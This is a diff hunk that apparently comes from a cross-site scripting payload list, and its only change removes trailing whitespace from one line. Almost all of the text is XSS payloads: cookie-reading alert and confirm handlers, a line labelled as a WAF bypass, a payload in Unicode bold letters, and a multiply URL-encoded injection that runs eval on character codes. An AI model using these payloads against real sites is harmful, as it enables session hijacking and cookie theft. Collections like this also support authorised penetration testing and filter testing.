@@ -93,7 +93,7 @@ javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>
 "><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
 1%22onfocus=%27alert%28document.cookie%29%27%20autofocus=
 1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
-"><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)> 
+"><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)>
 - 1'"();<test><ScRiPt >window.alert("XSS_WAF_BYPASS")
 '"><img src=x onerror=alert("xss!")>.pdf
 "><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d'block'%25253b%252bthis.onfocus%25253dnull%25253b"%252boNMoUseOVer%25253d"this['onmo'%25252b'useover']%25253dnull%25253beval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))%25253b"%252bAuToFOcus>
